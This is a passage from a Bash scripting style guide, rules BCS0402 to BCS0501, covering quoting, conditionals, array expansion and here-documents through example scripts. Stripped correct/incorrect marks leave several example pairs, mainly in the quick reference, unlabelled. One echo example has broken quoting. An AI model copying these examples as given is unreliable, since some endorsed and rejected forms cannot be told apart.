msg="It's $count o'clock"

# Mixing static and variables
echo 'Static text: ' "$variable" ' more static'
echo "Static text: $variable more static"
```

**Empty strings:**

```bash
var=''   #  Preferred for consistency
var=""   #  Also acceptable
```

**Summary:**
- **Single quotes `'...'`**: All static strings (no variables, no escapes)
- **Double quotes `"..."`**: Variable expansion or command substitution needed
- **Consistency**: Single quotes for static strings makes code scannable - double quotes signal "look for variables"


---


**Rule: BCS0402**

## Exception: One-Word Literals

**Literal one-word values containing only safe characters (alphanumeric, underscore, hyphen, dot, slash) may be left unquoted in variable assignments and simple conditionals. However, quoting is more defensive and recommended. This exception acknowledges common practice, but when in doubt, quote everything.**

**Rationale:**
- **Common Practice**: Widely used in shell scripts; reduces visual noise
- **Safety Threshold**: Only safe when value contains no special characters
- **Defensive Programming**: Quoting prevents bugs if value changes; eliminates mental overhead of "should I quote this?"
- **Team Preference**: Choice between brevity and safety; many teams require quotes everywhere

**What qualifies as a one-word literal:**
- Contains **only** alphanumeric (`a-zA-Z0-9`), underscores (`_`), hyphens (`-`), dots (`.`), forward slashes (`/`)
- Does **not** contain spaces, tabs, newlines, or shell special characters: `*?[]{}$` `` ` ``"'`\;&|<>()!#`
- Does **not** start with hyphen in conditionals (mistaken for option)

**Examples:**

```bash
#  Safe unquoted (but quoting better)
ORGANIZATION=Okusi
VERSION=1.0.0
PATH_SUFFIX=/usr/local
FLAG=true

#  Must be quoted
MESSAGE='Hello world'           # Space
PATTERN='*.txt'                 # Wildcard
EMAIL='user@domain.com'         # @
```

**Variable assignments:**

```bash
#  Acceptable - one-word literals unquoted
declare -- ORGANIZATION=Okusi
declare -- LOG_LEVEL=INFO
declare -- DEFAULT_PATH=/usr/local/bin

#  Better - always quote (defensive)
declare -- ORGANIZATION='Okusi'
declare -- LOG_LEVEL='INFO'
declare -- DEFAULT_PATH='/usr/local/bin'

#  MANDATORY - quote multi-word or special values
declare -- APP_NAME='My Application'
declare -- PATTERN='*.log'
declare -- EMAIL='admin@example.com'

#  Wrong - special characters unquoted
declare -- EMAIL=admin@example.com      # @ is special!
declare -- PATTERN=*.log                 # * will glob!
declare -- MESSAGE=Hello world           # Syntax error!
```

**Conditionals:**

```bash
declare -- status='success'

#  Acceptable
[[ "$status" == success ]]

#  Better - more consistent
[[ "$status" == 'success' ]]

#  MANDATORY - quote multi-word
[[ "$message" == 'File not found' ]]
[[ "$pattern" == '*.txt' ]]

#  Wrong
[[ "$message" == File not found ]]      # Syntax error!
[[ $status == success ]]                # Variable unquoted - dangerous!
```

**Case statement patterns:**

```bash
#  Acceptable - one-word literals unquoted
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  *) die 22 "Invalid action: $action" ;;
esac

#  MANDATORY - quote patterns with special characters
case "$email" in
  'admin@example.com') echo 'Admin' ;;    # Must quote @
  *) echo 'Unknown' ;;
esac
```

**Path construction:**

```bash
#  Acceptable - literal path segments unquoted
declare -- temp_file="$PWD"/.foobar.tmp
declare -- log_path=/var/log/myapp.log

#  Better - quote for consistency
declare -- temp_file="$PWD/.foobar.tmp"
declare -- log_path='/var/log/myapp.log'

#  MANDATORY - quote paths with spaces
declare -- docs_dir="$HOME/My Documents"

#  Wrong
declare -- docs_dir=$HOME/My Documents     # Word splitting!
```

**When quotes are mandatory:**

```bash
# 1. Values with spaces
MESSAGE='Hello world'               # 

# 2. Values with wildcards
PATTERN='*.txt'                     # 

# 3. Values with special characters
EMAIL='user@domain.com'             # 

# 4. Empty strings
VALUE=''                            # 

# 5. Values starting with hyphen (in conditionals)
[[ "$arg" == '-h' ]]                # 

# 6. Values with parentheses
FILE='test(1).txt'                  # 

# 7. Values with dollar signs (use single quotes)
LITERAL='$100'                      # 

# 8. Values with backslashes
PATH='C:\Users\Name'                # 

# 9. Values with quotes
MESSAGE='It'\''s working'           # 

# 10. Variable expansions (always quote)
BACKUP="$file.bak"                  # 
```

**Critical anti-patterns:**

```bash
#  Spaces unquoted
MESSAGE=File not found              # Syntax error!

#  Special characters unquoted
EMAIL=admin@example.com             # @ is special!

#  Wildcards unquoted
PATTERN=*.log                       # Glob expansion!

#  Inconsistent quoting
OPTION1=value1                      # Unquoted
OPTION2='value2'                    # Quoted
# Pick one style - be consistent!

#  Unquoted paths with spaces
DIR=/home/user/My Documents         # Word splitting!

#  Unquoted variable concatenation
FILE=$basename.txt                  # Dangerous!
FILE="$basename.txt"                #  Correct

#  Unquoted command substitution result
result=$(command)
echo $result                        # Word splitting!
echo "$result"                      #  Correct
```

**Edge cases:**

**1. Numeric values:**
```bash
COUNT=42                #  Acceptable (but quoting safer)
declare -i count=42     #  Correct for integers
((count = 10))          #  Arithmetic context
[[ "$count" -eq 42 ]]   #  Variable quoted
```

**2. Boolean-style values:**
```bash
ENABLED=true            #  Acceptable
declare -i ENABLED=1    #  Preferred for booleans
((ENABLED)) && echo 'Enabled'
```

**3. URLs and email addresses (MUST quote):**
```bash
URL='https://example.com/path'      #  Correct
EMAIL='user@domain.com'             #  Correct
```

**4. Version numbers:**
```bash
VERSION=1.0.0           #  Acceptable (dots only)
VERSION='1.0.0-beta'    #  Better
```

**5. Paths with spaces (MUST quote):**
```bash
PATH='/usr/local/bin'               #  Better
PATH='/Applications/My App.app'     #  MANDATORY (space)
CONFIG="$HOME/.config"              #  Variable quoted
```

**Recommendation summary:**

**Acceptable unquoted:**
- Single-word alphanumeric: `value`, `INFO`, `true`, `42`
- Simple paths (no spaces): `/usr/local/bin`
- File extensions: `.txt`, `.log`
- Version numbers: `1.0.0`, `2.5.3-beta`

**Mandatory quoting:**
- Any value with spaces: `'hello world'`
- Special characters: `'admin@example.com'`, `'*.txt'`
- Empty strings: `''`
- Quotes/backslashes: `'don'\''t'`, `'C:\path'`

**Best practice:** **Always quote everything except trivial cases.** When in doubt, quote it. The small reduction in visual noise is not worth the mental overhead or risk of bugs when values change.

**Summary:**
- **One-word literals**: alphanumeric, underscore, hyphen, dot, slash only
- **Acceptable unquoted**: assignments and conditionals (simple cases)
- **Better to quote**: defensive, prevents bugs
- **Mandatory quoting**: spaces, special characters, wildcards, empty strings
- **Always quote variables**: `"$var"` not `$var`
- **Consistency matters**: pick style, stick with it
- **Default to quoting**: when in doubt, quote everything

**Key principle:** The one-word literal exception acknowledges common practice, not to recommend it. Unquoted literals cause subtle bugs when values change. Safest approach: quote everything. Use unquoted sparingly for trivial cases only. Consider requiring quotes everywhere - eliminates quoting decisions, makes scripts robust.


---


**Rule: BCS0403**

## Strings with Variables

Use double quotes when the string contains variables requiring expansion:

```bash
# Message functions with variables
die 1 "Unknown option '$1'"
error "'$compiler' not found"
info "Installing to $PREFIX/bin"
success "Processed $count files"

# Echo statements with variables
echo "$SCRIPT_NAME $VERSION"
echo "Binary: $BIN_DIR/mailheader"
echo "Completion: $COMPLETION_DIR/mail-tools"

# Multi-line messages with variables
info '[DRY-RUN] Would install:' \
     "  $BIN_DIR/mailheader" \
     "  $BIN_DIR/mailmessage" \
     "  $LIB_DIR/mailheader.so"
```


---


**Rule: BCS0404**

## Mixed Quoting

When a string contains both static text and variables, use double quotes with single quotes nested for literal protection:

```bash
# Protect literal quotes around variables
die 2 "Unknown option '$1'"              # Single quotes are literal
die 1 "'gcc' compiler not found."        # 'gcc' shows literally with quotes
warn "Cannot access '$file_path'"        # Path shown with quotes

# Complex messages
info "Would remove: '$old_file' â†’ '$new_file'"
error "Permission denied for directory '$dir_path'"
```


---


**Rule: BCS0405**

## Command Substitution in Strings

Use double quotes when including command substitution:

```bash
# Command substitution requires double quotes
echo "Current time: $(date +%T)"
info "Found $(wc -l "$file") lines"
die 1 "Checksum failed: expected $expected, got $(sha256sum "$file")"

# Assign with command substitution
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"
TIMESTAMP="$(date -Ins)"
```


---


**Rule: BCS0406**

## Variables in Conditionals

**Always quote variables in test expressions; static comparison values follow normal quoting rules (single quotes for literals, unquoted acceptable for one-word values).**

**Rationale:**

- **Word Splitting Protection**: Unquoted variables break multi-word values into separate tokens
- **Glob Expansion Safety**: Unquoted variables trigger pathname expansion with wildcards (`*`, `?`, `[`)
- **Empty Value Safety**: Unquoted empty variables disappear, causing syntax errors
- **Security**: Prevents injection attacks exploiting word splitting

**Always quote variables:**

**File test operators:**

```bash
[[ -f "$file" ]]         #  Correct
[[ -f $file ]]           #  Wrong - word splitting if spaces
[[ -d "$path" ]]         #  Correct
[[ -r "$config_file" ]]  #  Correct
[[ -w "$log_file" ]]     #  Correct
```

**String comparisons:**

```bash
[[ "$name" == "$expected" ]]    #  Both variables quoted
[[ "$filename" == *.txt ]]      #  Pattern unquoted for globbing
[[ "$filename" == '*.txt' ]]    #  Literal match (no globbing)
[[ -n "$value" ]]               #  Non-empty test
[[ -z "$value" ]]               #  Empty test
```

**Integer comparisons:**

```bash
[[ "$count" -eq 0 ]]            #  Correct
[[ "$count" -gt 10 ]]           #  Correct
[[ "$a" -lt "$b" ]]             #  Less than
[[ "$a" -ge "$b" ]]             #  Greater/equal
```

**Logical operators:**

```bash
[[ -f "$file" && -r "$file" ]]  #  Both quoted
[[ -f "$file1" || -f "$file2" ]] #  OR
[[ ! -f "$file" ]]               #  NOT
```

**Static comparison values:**

**Single-word literals (unquoted acceptable):**

```bash
[[ "$action" == start ]]        #  One-word literal
[[ "$action" == 'start' ]]      #  Also correct
```

**Multi-word literals (single quotes required):**

```bash
[[ "$message" == 'hello world' ]]        #  Correct
[[ "$message" == hello world ]]          #  Syntax error
```

**Special characters (must quote):**

```bash
[[ "$input" == 'user@domain.com' ]]      #  Contains @
[[ "$path" == '/usr/local/bin' ]]        #  Contains /
[[ "$pattern" == '*.txt' ]]              #  Literal asterisk
```

**Pattern matching:**

**Glob patterns (unquoted for matching):**

```bash
[[ "$filename" == *.txt ]]               #  Matches any .txt
[[ "$filename" == *.@(jpg|png) ]]        #  Extended glob
[[ "$filename" == '*.txt' ]]             #  Literal "*.txt" only
```

**Regex patterns (=~ operator):**

```bash
[[ "$email" =~ ^[a-z]+@[a-z]+\.[a-z]+$ ]]  #  Regex unquoted
pattern='^[0-9]{3}-[0-9]{4}$'
[[ "$phone" =~ $pattern ]]               #  Pattern variable unquoted
[[ "$phone" =~ "$pattern" ]]             #  Treats as literal string
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

validate_file() {
  local -- file="$1"
  local -- required_ext="$2"

  [[ ! -f "$file" ]] && { error "File not found: $file"; return 2; }
  [[ ! -r "$file" ]] && { error "Not readable: $file"; return 5; }
  [[ ! -s "$file" ]] && { error "Empty: $file"; return 22; }

  if [[ "$file" == *."$required_ext" ]]; then
    info "Correct extension: .$required_ext"
  else
    error "Must have .$required_ext extension"
    return 22
  fi
}

validate_input() {
  local -- input="$1"
  local -- email_pattern='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  [[ -z "$input" ]] && { error 'Input cannot be empty'; return 22; }
  [[ "${#input}" -lt 3 ]] && { error "Too short: minimum 3 chars"; return 22; }
  [[ "$input" == admin* ]] && { warn "Reserved prefix 'admin'"; return 1; }

  if [[ "$input" =~ $email_pattern ]]; then
    info "Valid email: $input"
  else
    error "Invalid email: $input"
    return 22
  fi
}

main() {
  local -- test_file='data.txt'
  local -- test_email='user@example.com'

  validate_file "$test_file" 'txt' && success "Validated: $test_file"
  validate_input "$test_email" && success "Validated: $test_email"
}

main "$@"

#fin
```

**Critical anti-patterns:**

```bash
#  Unquoted variable with spaces
file='my file.txt'
[[ -f $file ]]  # Syntax error!
[[ -f "$file" ]]  #  Correct

#  Unquoted variable with glob chars
file='*.txt'
[[ -f $file ]]  # Expands to all .txt files!
[[ -f "$file" ]]  #  Tests literal "*.txt"

#  Unquoted empty variable
name=''
[[ -z $name ]]  # Syntax error: [[ -z ]]
[[ -z "$name" ]]  #  Correct

#  Unquoted in string comparison
action='start server'
[[ $action == start ]]  # Syntax error!
[[ "$action" == start ]]  #  Correct

#  Quoted regex pattern variable
pattern='^test'
[[ "$input" =~ "$pattern" ]]  #  Literal string
[[ "$input" =~ $pattern ]]  #  Regex matching
```

**Edge cases:**

**Variables with dashes:**

```bash
arg='-v'
[[ "$arg" == '-v' ]]  #  Quoted protects against option interpretation
```

**Unset variables:**

```bash
unset var
[[ -z "$var" ]]      # True (empty)
[[ -z "${var:-}" ]]  # Safe with set -u
```

**Case-insensitive:**

```bash
shopt -s nocasematch
[[ "$input" == yes ]]  # Matches: yes, YES, Yes, etc.
shopt -u nocasematch
```

**Legacy [ ] test (quote always, no exceptions):**

```bash
[ -f "$file" ]               #  Correct
[ -f $file ]                 #  Very dangerous
[ "$var" = "value" ]         #  Use = not ==
[[ -f "$file" ]]             #  Preferred modern syntax
```

**Summary:**

- **Always quote variables** in conditionals: `[[ -f "$file" ]]`
- **File/string/integer tests**: Quote variables consistently
- **Pattern matching**: Quote variable, unquote pattern for globbing: `[[ "$file" == *.txt ]]`
- **Regex**: Quote variable, unquote pattern: `[[ "$input" =~ $pattern ]]`
- **Static literals**: Single quotes for multi-word/special chars, optional for one-word
- **Safety**: Quoting prevents word splitting, glob expansion, injection attacks

**Key principle:** Variable quoting in conditionals is mandatory. Static values follow normal rules: single quotes for literals, one-word values can be unquoted. When in doubt, quote everything.


---


**Rule: BCS0407**

## Array Expansions

**Always quote array expansions with double quotes to preserve element boundaries and prevent word splitting. Use `"${array[@]}"` for separate elements and `"${array[*]}"` for a single concatenated string.**

**Rationale:**

- **Element Preservation**: `"${array[@]}"` preserves each element as separate word regardless of content; unquoted arrays undergo word splitting and pathname expansion
- **Empty/Special Content**: Quoted arrays preserve empty elements, spaces, newlines, and glob characters; unquoted arrays lose empty elements and split on whitespace
- **Safe Iteration**: `"${array[@]}"` is the only safe form for loops, function arguments, and command arguments

**Basic array expansion forms:**

**1. Expand all elements as separate words (`[@]`):**

```bash
# Create array
declare -a files=('file1.txt' 'file 2.txt' 'file3.txt')

#  Correct - quoted expansion (3 elements)
for file in "${files[@]}"; do
  echo "$file"
done
# Output:
# file1.txt
# file 2.txt
# file3.txt

#  Wrong - unquoted expansion (4 elements due to word splitting!)
for file in ${files[@]}; do
  echo "$file"
done
# Output:
# file1.txt
# file
# 2.txt
# file3.txt
```

**2. Expand all elements as single string (`[*]`):**

```bash
# Array of words
declare -a words=('hello' 'world' 'foo' 'bar')

#  Correct - single space-separated string
combined="${words[*]}"
echo "$combined"  # Output: hello world foo bar

# With custom IFS
IFS=','
combined="${words[*]}"
echo "$combined"  # Output: hello,world,foo,bar
IFS=' '
```

**When to use [@] vs [*]:**

**Use `[@]` (expand to separate words):**

```bash
# 1. Iteration
for item in "${array[@]}"; do
  process "$item"
done

# 2. Passing to functions
my_function "${array[@]}"

# 3. Passing to commands
grep pattern "${files[@]}"

# 4. Building new arrays
new_array=("${old_array[@]}" "additional" "elements")

# 5. Copying arrays
copy=("${original[@]}")
```

**Use `[*]` (expand to single string):**

```bash
# 1. Concatenating for output
echo "Items: ${array[*]}"

# 2. Custom separator with IFS
IFS=','
csv="${array[*]}"  # Creates comma-separated values

# 3. String comparison
if [[ "${array[*]}" == "one two three" ]]; then

# 4. Logging multiple values
log "Processing: ${files[*]}"
```

**Complete array expansion examples:**

**1. Safe array iteration:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Process files with spaces in names
process_files() {
  local -a files=(
    'document 1.txt'
    'report (final).pdf'
    'data-2024.csv'
  )

  local -- file
  local -i count=0

  #  Correct - quoted expansion
  for file in "${files[@]}"; do
    if [[ -f "$file" ]]; then
      info "Processing: $file"
      ((count+=1))
    else
      warn "File not found: $file"
    fi
  done

  info "Processed $count files"
}

# Pass array to function
process_items() {
  local -a items=("$@")  # Capture arguments as array
  local -- item

  info "Received ${#items[@]} items"

  for item in "${items[@]}"; do
    info "Item: $item"
  done
}

main() {
  declare -a my_items=('item one' 'item two' 'item three')

  #  Correct - pass array elements as separate arguments
  process_items "${my_items[@]}"

  # Process files
  process_files
}

main "$@"

#fin
```

**2. Array with custom IFS:**

```bash
# Create CSV from array
create_csv() {
  local -a data=("$@")
  local -- csv

  # Save original IFS
  local -- old_ifs="$IFS"

  # Set custom separator
  IFS=','
  csv="${data[*]}"  # Uses IFS as separator

  # Restore IFS
  IFS="$old_ifs"

  echo "$csv"
}

# Usage
declare -a fields=('name' 'age' 'email')
csv_line=$(create_csv "${fields[@]}")
echo "$csv_line"  # Output: name,age,email
```

**3. Building arrays from arrays:**

```bash
# Combine multiple arrays
declare -a fruits=('apple' 'banana')
declare -a vegetables=('carrot' 'potato')
declare -a dairy=('milk' 'cheese')

#  Correct - combine arrays
declare -a all_items=(
  "${fruits[@]}"
  "${vegetables[@]}"
  "${dairy[@]}"
)

echo "Total items: ${#all_items[@]}"  # Output: 6

# Add prefix to each element
declare -a files=('report.txt' 'data.csv')
declare -a prefixed=()

local -- file
for file in "${files[@]}"; do
  prefixed+=("/backup/$file")
done

# Result: /backup/report.txt, /backup/data.csv
```

**4. Array expansion in commands:**

```bash
# Pass array elements to command
declare -a search_paths=(
  '/usr/local/bin'
  '/usr/bin'
  '/opt/custom/bin'
)

#  Correct - each path is separate argument
find "${search_paths[@]}" -type f -name 'myapp'

# Grep multiple patterns
declare -a patterns=('error' 'warning' 'critical')

#  Correct - each pattern as separate -e argument
local -- pattern
local -a grep_args=()
for pattern in "${patterns[@]}"; do
  grep_args+=(-e "$pattern")
done

grep "${grep_args[@]}" logfile.txt
```

**5. Conditional array checks:**

```bash
# Check if array contains value
array_contains() {
  local -- needle="$1"
  shift
  local -a haystack=("$@")
  local -- item

  for item in "${haystack[@]}"; do
    [[ "$item" == "$needle" ]] && return 0
  done

  return 1
}

declare -a allowed_users=('alice' 'bob' 'charlie')

if array_contains 'bob' "${allowed_users[@]}"; then
  info 'User authorized'
else
  error 'User not authorized'
fi
```

**Critical anti-patterns:**

```bash
#  Wrong - unquoted [@] expansion causes word splitting
declare -a files=('file 1.txt' 'file 2.txt')
for file in ${files[@]}; do
  echo "$file"
done
# Splits on spaces: 'file', '1.txt', 'file', '2.txt'

#  Correct - quoted expansion
for file in "${files[@]}"; do
  echo "$file"
done
# Preserves: 'file 1.txt', 'file 2.txt'

#  Wrong - using [@] without quotes in assignment
declare -a source=('a' 'b' 'c')
copy=(${source[@]})  # Word splitting!

#  Correct - quoted expansion
copy=("${source[@]}")

#  Wrong - using [*] for iteration
for item in "${array[*]}"; do  # Single iteration with all elements!
  echo "$item"
done

#  Correct - using [@] for iteration
for item in "${array[@]}"; do  # Separate iteration per element
  echo "$item"
done

#  Wrong - unquoted array with glob characters
declare -a patterns=('*.txt' '*.md')
for pattern in ${patterns[@]}; do
  # Glob expansion happens - wrong!
  echo "$pattern"
done

#  Correct - quoted to preserve literal values
for pattern in "${patterns[@]}"; do
  echo "$pattern"
done
```

**Edge cases:**

**1. Empty arrays:**

```bash
# Empty array
declare -a empty=()

#  Correct - safe iteration (zero iterations)
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done

# Array count
echo "Count: ${#empty[@]}"  # Output: 0
```

**2. Arrays with empty elements:**

```bash
# Array with empty string
declare -a mixed=('first' '' 'third')

#  Quoted - preserves empty element (3 iterations)
for item in "${mixed[@]}"; do
  echo "Item: [$item]"
done
# Output:
# Item: [first]
# Item: []
# Item: [third]

#  Unquoted - loses empty element (2 iterations)
for item in ${mixed[@]}; do
  echo "Item: [$item]"
done
# Output:
# Item: [first]
# Item: [third]
```

**3. Arrays with newlines:**

```bash
# Array with newline in element
declare -a data=(
  'line one'
  $'line two\nline three'
  'line four'
)

#  Quoted - preserves newline
for item in "${data[@]}"; do
  echo "Item: $item"
  echo "---"
done
```

**4. Associative arrays:**

```bash
# Associative array
declare -A config=(
  [name]='myapp'
  [version]='1.0.0'
)

#  Correct - iterate over keys
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done

#  Correct - iterate over values
for value in "${config[@]}"; do
  echo "Value: $value"
done
```

**5. Array slicing and parameter expansion:**

```bash
# Array slicing
declare -a numbers=(0 1 2 3 4 5 6 7 8 9)

#  Correct - quoted slice
subset=("${numbers[@]:2:4}")  # Elements 2-5
echo "${subset[@]}"  # Output: 2 3 4 5

# All elements from index 5
tail=("${numbers[@]:5}")
echo "${tail[@]}"  # Output: 5 6 7 8 9

# Modify array elements
declare -a paths=('/usr/bin' '/usr/local/bin')

# Remove prefix from all elements
declare -a basenames=("${paths[@]##*/}")
echo "${basenames[@]}"  # Output: bin bin

# Add suffix to all elements
declare -a configs=('app' 'db' 'cache')
declare -a config_files=("${configs[@]/%/.conf}")
echo "${config_files[@]}"  # Output: app.conf db.conf cache.conf
```

**Summary:**

- **Always quote array expansions**: `"${array[@]}"` or `"${array[*]}"`
- **Use `[@]`** for separate elements (iteration, function args, commands)
- **Use `[*]`** for single concatenated string (display, logging, CSV with IFS)
- **Unquoted arrays** undergo word splitting and glob expansion - never safe
- **Empty elements** are preserved only with quoted expansion
- **Element boundaries** are maintained only when properly quoted

**Key principle:** Array expansion quoting is non-negotiable. The form `"${array[@]}"` is the standard safe way to expand arrays. Any deviation introduces word splitting and glob expansion bugs. For single strings, explicitly use `"${array[*]}"`. For iteration or passing to functions/commands, always use `"${array[@]}"`.


---


**Rule: BCS0408**

## Here Documents

Use appropriate quoting for here documents based on whether expansion is needed:

```bash
# No expansion - single quotes on delimiter
cat <<'EOF'
This text is literal.
$VAR is not expanded.
$(command) is not executed.
EOF

# With expansion - no quotes on delimiter
cat <<EOF
Script: $SCRIPT_NAME
Version: $VERSION
Time: $(date)
EOF

# With expansion - double quotes on delimiter (same as no quotes)
cat <<"EOF"     # Note: double quotes same as no quotes for here docs
Script: $SCRIPT_NAME
EOF
```


---


**Rule: BCS0409**

## Echo and Printf Statements

```bash
# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
echo "Installing to $PREFIX/bin"
printf 'Found %d files in %s\n' "$count" "$dir"

# Mixed content
echo "  " Binary: $BIN_DIR/mailheader"
echo "  " Version: $VERSION (released $(date))"
```


---


**Rule: BCS0410**

## Summary Reference

| Content Type | Quote Style | Example |
|--------------|-------------|---------|
| Static string | Single `'...'` | `info 'Starting process'` |
| One-word literal (assignment) | Optional quotes | `VAR=value` or `VAR='value'` |
| One-word literal (conditional) | Optional quotes | `[[ $x == value ]]` or `[[ $x == 'value' ]]` |
| String with variable | Double `"..."` | `info "Processing $file"` |
| Variable in string | Double `"..."` | `echo "Count: $count"` |
| Literal quotes in string | Double with nested single | `die 1 "Unknown '$1'"` |
| Command substitution | Double `"..."` | `echo "Time: $(date)"` |
| Variables in conditionals | Double `"$var"` | `[[ -f "$file" ]]` |
| Static in conditionals | Single `'...'` or unquoted | `[[ "$x" == 'value' ]]` or `[[ "$x" == value ]]` |
| Array expansion | Double `"${arr[@]}"` | `for i in "${arr[@]}"` |
| Here doc (no expansion) | Single on delimiter | `cat <<'EOF'` |
| Here doc (with expansion) | No quotes on delimiter | `cat <<EOF` |


---


**Rule: BCS0411**

## Anti-Patterns (What NOT to Do)

Common quoting mistakes lead to bugs, security vulnerabilities, and poor code quality. Each shows incorrect () and correct () forms.

**Rationale:**
- **Security**: Improper quoting enables injection attacks
- **Reliability**: Unquoted variables cause word splitting and glob expansion bugs
- **Consistency**: Mixed styles reduce maintainability
- **Performance**: Unnecessary quoting/bracing adds parsing overhead

**Category 1: Double quotes for static strings**

Most common anti-pattern.

```bash
#  Wrong - double quotes for static strings
info "Checking prerequisites..."
readonly ERROR_MSG="Invalid input"

#  Correct - single quotes
info 'Checking prerequisites...'
readonly ERROR_MSG='Invalid input'

#  Wrong - double quotes in case patterns
case "$action" in
  "start") start_service ;;
esac

#  Correct - unquoted one-word patterns
case "$action" in
  start) start_service ;;
esac
```

**Category 2: Unquoted variables**

Dangerous and unpredictable.

```bash
#  Wrong - unquoted in conditional, assignment, command
[[ -f $file ]]
target=$source
rm $temp_file

#  Correct - quoted
[[ -f "$file" ]]
target="$source"
rm "$temp_file"

#  Wrong - unquoted array expansion
for item in ${items[@]}; do
  process $item
done

#  Correct - quoted
for item in "${items[@]}"; do
  process "$item"
done
```

**Category 3: Unnecessary braces**

Use only when required.

```bash
#  Wrong - braces not needed
echo "${HOME}/bin"
[[ -f "${file}" ]]

#  Correct - no braces
echo "$HOME/bin"
[[ -f "$file" ]]

# When braces ARE needed:
echo "${HOME:-/tmp}"        # Default value
echo "${file##*/}"          # Parameter expansion
echo "${array[@]}"          # Array expansion
echo "${var1}${var2}"       # Adjacent variables
```

**Category 4: Glob expansion dangers**

Unquoted variables trigger unwanted glob expansion.

```bash
#  Wrong - unquoted with glob characters
pattern='*.txt'
echo $pattern        # Expands to all .txt files!

#  Correct - quoted
echo "$pattern"      # Outputs: *.txt
```

**Category 5: Command substitution quoting**

```bash
#  Wrong - unquoted command substitution
result=$(command)
echo $result         # Word splitting!

#  Correct - quoted
result=$(command)
echo "$result"       # Preserves whitespace
```

**Category 6: Here-document quoting**

```bash
#  Wrong - quoted delimiter when variables needed
cat <<"EOF"
User: $USER          # Not expanded
EOF

#  Correct - unquoted for expansion
cat <<EOF
User: $USER          # Expands
EOF

#  Correct - quoted for literal JSON
cat <<'EOF'
{
  "api_key": "$API_KEY"    # Literal
}
EOF
```

**Complete example with corrections:**

```bash
#  WRONG VERSION
VERSION="1.0.0"                              #  Double quotes for static
SCRIPT_PATH=${0}                             #  Unquoted
BIN_DIR="${PREFIX}/bin"                      #  Braces not needed
info "Starting ${SCRIPT_NAME}..."            #  Double quotes, braces

check_file() {
  local file=$1                              #  Unquoted
  if [[ -f $file ]]; then                    #  Unquoted
    info "Processing ${file}..."             #  Braces
  fi
}

for file in ${files[@]}; do                  #  Unquoted - breaks on spaces!
  check_file $file
done

#  CORRECT VERSION
VERSION='1.0.0'                              #  Single quotes
SCRIPT_PATH=$(realpath -- "$0")              #  Quoted
BIN_DIR="$PREFIX/bin"                        #  No braces
info 'Starting script...'                    #  Single quotes

check_file() {
  local -- file="$1"                         #  Quoted
  if [[ -f "$file" ]]; then                  #  Quoted
    info "Processing $file..."               #  No braces
  fi
}

for file in "${files[@]}"; do                #  Quoted array
  check_file "$file"
done
```

**Quick reference:**

```bash
# Static strings ’ Single quotes
'literal text'                
"literal text"                

# Variables ’ Double quotes, no braces
"text with $var"              
"text with ${var}"            

# Variables in commands/conditionals ’ Quoted
echo "$var"                   
[[ -f "$file" ]]              
echo $var                     

# Array expansion ’ Quoted
"${array[@]}"                 
${array[@]}                   

# Braces ’ Only when needed
"${var##*/}"                   (parameter expansion)
"${array[@]}"                  (array)
"${var1}${var2}"               (adjacent)
"${HOME}"                      (not needed)

# Command substitution ’ Quote variable, not path
result=$(cat "$file")         
result=$(cat "${file}")       
```

**Summary:**
- **Never use double quotes for static strings** - use single quotes
- **Always quote variables** - in conditionals, assignments, commands
- **Don't use braces unless required** - parameter expansion, arrays, adjacent variables only
- **Quote array expansions** - `"${array[@]}"` mandatory
- **Be consistent** - don't mix quote styles

**Key principle:** Quoting anti-patterns make code fragile and insecure. Proper quoting eliminates entire classes of bugs. When in doubt: quote variables, use single quotes for static text, avoid unnecessary braces.


---


**Rule: BCS0412**

## String Trimming
```bash
trim() {
  local v="$*"
  v="${v#"${v%%[![:blank:]]*}"}"
  echo -n "${v%"${v##*[![:blank:]]}"}"
}
```


---


**Rule: BCS0413**

## Display Declared Variables
```bash
decp() { declare -p "$@" | sed 's/^declare -[a-zA-Z-]* //'; }
```


---


**Rule: BCS0414**

## Pluralisation Helper
```bash
s() { (( ${1:-1} == 1 )) || echo -n 's'; }
```


---


**Rule: BCS0500**

# Arrays

This section covers array declaration and usage in Bash, including indexed arrays (`declare -a`) and associative arrays (`declare -A`). It addresses safe iteration with `"${array[@]}"` to prevent word-splitting, proper element access, and patterns for safely handling lists. Arrays provide a robust alternative to space/newline-separated strings and enable safe processing of filenames containing spaces or special characters.


---


**Rule: BCS0501**

## Array Declaration and Usage

**Declaring arrays:**

```bash
# Indexed arrays (explicitly declared)
declare -a DELETE_FILES=('*~' '~*' '.~*')
declare -a paths=()  # Empty array

# Local arrays in functions
local -a Paths=()
local -a found_files

# Initialize with elements
declare -a colors=('red' 'green' 'blue')
```

**Rationale:** Explicit `declare -a` signals array type, prevents scalar assignment, provides scope control via `local -a`, and ensures consistency.

**Adding elements:**

```bash
Paths+=("$1")                    # Append single element
args+=("$arg1" "$arg2" "$arg3")  # Append multiple
all_files+=("${config_files[@]}" "${log_files[@]}")  # Append array
```

**Array iteration (always quote `"${array[@]}"`)**

```bash
#  Correct - quoted expansion
for path in "${Paths[@]}"; do
  process "$path"
done
```

**Array length:**

```bash
file_count=${#files[@]}
((${#Paths[@]} > 0)) && process_paths
((${#Paths[@]})) || Paths=('.')  # Set default if empty
```

**Reading into arrays:**

```bash
IFS=',' read -ra fields <<< "$csv_line"
readarray -t lines < <(grep pattern file)  # Preferred: removes newlines, avoids subshell
mapfile -t users < <(cut -d: -f1 /etc/passwd)  # Alternative to readarray
```

